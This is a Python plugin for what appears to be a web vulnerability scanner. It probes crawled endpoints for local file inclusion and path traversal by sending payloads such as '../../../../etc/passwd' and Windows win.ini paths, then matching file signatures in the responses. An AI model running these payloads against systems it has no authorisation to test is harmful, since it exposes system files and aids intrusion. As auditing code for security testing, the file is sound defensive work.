import asyncio
import aiohttp
import re

NAME = "lfi_auditor"
CATEGORY = "vuln"
DESCRIPTION = "Local File Inclusion & Path Traversal Auditor"

OPTIONS = [
    {"name": "timeout", "type": int, "default": 5, "help": "Request timeout (seconds)"},
    {"name": "concurrency", "type": int, "default": 5, "help": "Concurrent attack threads"},
]

LFI_PAYLOADS = [
    "/etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "C:\\Windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
]

LFI_SIGNATURES = [
    r"root:x:0:0:",
    r"\[extensions\]",
    r"\[fonts\]",
    r"bin:x:1:1:",
]

class LFIAuditor:
    def __init__(self, emit, session, options):
        self.emit = emit
        self.session = session
        self.options = options

    async def check_lfi(self, url, method, pname):
        """Checks for LFI/Path Traversal."""
        findings = []
        for payload in LFI_PAYLOADS:
            try:
                async with self.session.request(method, url, params={pname: payload}, timeout=self.options.get("timeout")) as r:
                    body = await r.text()
                    for sig in LFI_SIGNATURES:
                        if re.search(sig, body, re.I):
                            findings.append({
                                "url": url,
                                "parameter": pname,
                                "type": "LFI",
                                "severity": "CRITICAL",
                                "evidence": f"Found signature '{sig}' in response using payload {payload}"
                            })
                            return findings # Found, stop for this param
            except:
                continue
        return findings

async def run(target, emit, options=None):
    emit.info(f"[*] LFI_AUDITOR: Probing for Local File Inclusion on {target}")
    
    spider_intel = options.get("spider_intel", {}) if options else {}
    endpoints = spider_intel.get("endpoints", [])
    
    surfaces = []
    for ep in endpoints:
        for p_items in ep.get("params", {}).values():
            for p in p_items:
                # Parameters suggesting files or paths
                if any(x in p.lower() for x in ["file", "path", "page", "doc", "view", "template", "include", "dir", "name"]):
                    surfaces.append({"url": ep.get("url"), "method": ep.get("method", "GET"), "parameter": p})

    if not surfaces:
        emit.warn("[!] No suitable injection surfaces identified for LFI testing.")
        return {"raw": "No targets", "signals": []}

    emit.info(f"    [i] Auditing {len(surfaces)} potential LFI surface(s)...")

    findings = []
    async with aiohttp.ClientSession() as session:
        auditor = LFIAuditor(emit, session, options or {})
        for s in surfaces:
            res = await auditor.check_lfi(s["url"], s["method"], s["parameter"])
            if res:
                findings.extend(res)
                for f in res:
                    emit.warn(f"        [!] LFI FOUND: {f['url']} via {f['parameter']}")

    if findings:
        emit.success(f"[+] LFI_AUDITOR complete. Found {len(findings)} LFI vulnerabilities!")
    else:
        emit.info("[-] No LFI vulnerabilities detected.")

    return {
        "raw": f"Audited {len(surfaces)} surfaces. Found {len(findings)} LFI.",
        "intel": {
            "vulnerabilities": findings
        },
        "signals": ["LFI_FOUND" if findings else "NO_LFI"]
    }
